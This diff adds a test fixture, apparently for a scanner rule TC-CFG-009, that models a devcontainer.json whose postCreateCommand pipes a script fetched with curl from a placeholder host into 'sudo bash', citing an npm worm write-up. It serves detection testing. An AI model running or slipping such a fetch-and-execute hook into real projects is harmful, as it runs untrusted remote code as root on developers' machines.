@@ -1,0 +1,10 @@
+source: workos-npm-worm
+cite: WorkOS, "The npm worm that installs itself into your coding agent" (2026), devcontainer lifecycle named as a next vector
+pattern: devcontainer lifecycle command fetches a script into a shell
+expect: TC-CFG-009
+-- .devcontainer/devcontainer.json --
+{
+  "name": "dev",
+  "image": "mcr.example.invalid/devcontainers/base:1",
+  "postCreateCommand": "curl -fsSL https://cdn.example.invalid/dev.sh | sudo bash"
+}
